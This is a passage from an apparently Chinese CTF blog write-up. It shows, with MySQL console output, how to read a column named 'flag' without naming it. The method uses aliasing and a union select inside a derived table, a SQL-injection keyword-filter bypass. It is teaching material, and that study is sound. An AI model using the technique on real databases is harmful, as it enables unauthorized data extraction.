-<h1 id="0x02-问题思考"><a href="#0x02-问题思考" class="headerlink" title="0x02 问题思考"></a>0x02 问题思考</h1><p>常规的查询是<code>select flag from users</code>,如果我要在们的查询语句中不见到<code>flag</code>，就得把<code>flag</code>这个列设置别名，mysql设置列别名有两种方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select flag as haha from users;</span><br><span class="line">+-----------+</span><br><span class="line">| haha      |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (flag)haha from users;</span><br><span class="line">+-----------+</span><br><span class="line">| haha      |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
-<p>但是这样我们还会出现flag这个字段。这时候想到这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1;</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1,2;</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
-<p>这样列名不久变成我们想要的结果，然而我们想要的结果是users表的内容，我们可以使用联合查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2 union select * from users;</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">| 31   | daiker666 |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure></p>
-<p>这样我们想要的值就在表里面，，下面思考下怎么提取出来，查询的结果是一张虚表，我们可以用设置别名的方法给这张表命名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select 1,2 union select * from users)c;</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">| 31   | daiker666 |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure></p>
-<p>然后提取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select c.2 from (select 1,2 union select * from users)c limit 1,2;</span><br><span class="line">+-----------+</span><br><span class="line">| 2         |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-        <a data-url="https://www.daikersec.com/post/a62e54a0.html" data-id="cjfmscznv0003t4uhixhy4qb5" class="article-share-link">Share</a>
-      
-
-      
-
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/注入/">注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
-  </nav>
 </section>
       
       <aside id="sidebar">
